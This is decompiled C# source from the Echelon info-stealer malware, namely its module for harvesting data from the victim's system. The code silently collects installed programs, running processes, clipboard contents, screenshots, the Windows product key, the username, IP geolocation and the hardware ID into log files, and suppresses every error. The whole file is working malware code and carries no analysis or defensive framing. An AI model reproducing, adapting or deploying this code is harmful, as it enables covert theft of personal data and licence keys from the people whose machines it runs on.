using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Echelon.Global;
using Echelon.Stealer.Browsers.Helpers.NoiseMe.Drags.App.Models.JSON;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x02000024 RID: 36
	internal class Systemsinfo
	{
		// Token: 0x0600005D RID: 93 RVA: 0x00005384 File Offset: 0x00003584
		[STAThread]
		public static void GetSystemsData(string collectionDir)
		{
			try
			{
				Task[] t01 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetSystem(collectionDir);
					})
				};
				Task[] t02 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetProg(collectionDir);
					})
				};
				Task[] t03 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetProc(collectionDir);
					})
				};
				Task[] t04 = new Task[]
				{
					new Task(delegate()
					{
						BuffBoard.GetClipboard(collectionDir);
					})
				};
				Task[] t05 = new Task[]
				{
					new Task(delegate()
					{
						Screenshot.GetScreenShot(collectionDir);
					})
				};
				new Thread(delegate()
				{
					Task[] t = t01;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t02;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t03;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t04;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t05;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				Task.WaitAll(t01);
				Task.WaitAll(t02);
				Task.WaitAll(t03);
				Task.WaitAll(t04);
				Task.WaitAll(t05);
			}
			catch
			{
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00005510 File Offset: 0x00003710
		public static void GetProg(string Echelon_Dir)
		{
			using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Programs.txt", false, Encoding.Default))
			{
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					for (int i = 0; i < subKeyNames.Length; i++)
					{
						string text = registryKey.OpenSubKey(subKeyNames[i]).GetValue("DisplayName") as string;
						if (text != null)
						{
							streamWriter.WriteLine(text);
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000055C0 File Offset: 0x000037C0
		public static void GetProc(string Echelon_Dir)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
				{
					Process[] processes = Process.GetProcesses();
					for (int i = 0; i < processes.Length; i++)
					{
						streamWriter.WriteLine(processes[i].ProcessName);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00005648 File Offset: 0x00003848
		public static string GetGpuName()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string str = text;
						object obj = managementObject["Description"];
						text = str + ((obj != null) ? obj.ToString() : null) + " ";
					}
				}
				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000572C File Offset: 0x0000392C
		public static string GetPhysicalMemory()
		{
			string result;
			try
			{
				ManagementScope scope = new ManagementScope();
				ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
				ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
				long num = 0L;
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
					num += num2;
				}
				num = num / 1024L / 1024L;
				result = num.ToString();
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000057E4 File Offset: 0x000039E4
		public static string GetOSInformation()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return string.Concat(new string[]
					{
						((string)managementObject["Caption"]).Trim(),
						", ",
						(string)managementObject["Version"],
						", ",
						(string)managementObject["OSArchitecture"]
					});
				}
				catch
				{
				}
			}
			return "BIOS Maker: Unknown";
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000058BC File Offset: 0x00003ABC
		public static string GetComputerName()
		{
			string result;
			try
			{
				ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in instances)
				{
					text = (string)((ManagementObject)managementBaseObject)["Name"];
				}
				result = text;
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00005950 File Offset: 0x00003B50
		public static string GetProcessorName()
		{
			string result;
			try
			{
				ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in instances)
				{
					text = (string)((ManagementObject)managementBaseObject)["Name"];
				}
				result = text;
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000059E4 File Offset: 0x00003BE4
		public static void GetSystem(string Echelon_Dir)
		{
			ComputerInfo computerInfo = new ComputerInfo();
			Size size = Screen.PrimaryScreen.Bounds.Size;
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(Systemsinfo.information, false, Encoding.Default))
				{
					TextWriter textWriter = streamWriter;
					string[] array = new string[32];
					array[0] = "==================================================\n Operating system: ";
					int num = 1;
					OperatingSystem osversion = Environment.OSVersion;
					array[num] = ((osversion != null) ? osversion.ToString() : null);
					array[2] = " | ";
					array[3] = computerInfo.OSFullName;
					array[4] = "\n PC user: ";
					array[5] = Environment.MachineName;
					array[6] = "/";
					array[7] = Environment.UserName;
					array[8] = "\n WinKey: ";
					array[9] = WinKey.GetWindowsKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId");
					array[10] = "\n==================================================\n Screen resolution: ";
					int num2 = 11;
					Size size2 = size;
					array[num2] = size2.ToString();
					array[12] = "\n Current time Utc: ";
					array[13] = DateTime.UtcNow.ToString();
					array[14] = "\n Current time: ";
					array[15] = DateTime.Now.ToString();
					array[16] = "\n==================================================\n CPU: ";
					array[17] = Systemsinfo.GetProcessorName();
					array[18] = "\n RAM: ";
					array[19] = Systemsinfo.GetPhysicalMemory();
					array[20] = "\n GPU: ";
					array[21] = Systemsinfo.GetGpuName();
					array[22] = "\n ==================================================\n IP Geolocation: ";
					array[23] = Echelon.Global.Help.IP();
					array[24] = " ";
					array[25] = Echelon.Global.Help.Country();
					array[26] = "\n Log Date: ";
					array[27] = Echelon.Global.Help.date;
					array[28] = "\n Version build: ";
					array[29] = JsonValue.buildversion;
					array[30] = "\n HWID: ";
					array[31] = Echelon.Global.Help.HWID;
					textWriter.WriteLine(string.Concat(array));
					streamWriter.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003E RID: 62
		public static string information = Echelon.Global.Help.collectionDir + "\\System_Information.txt";
	}
}
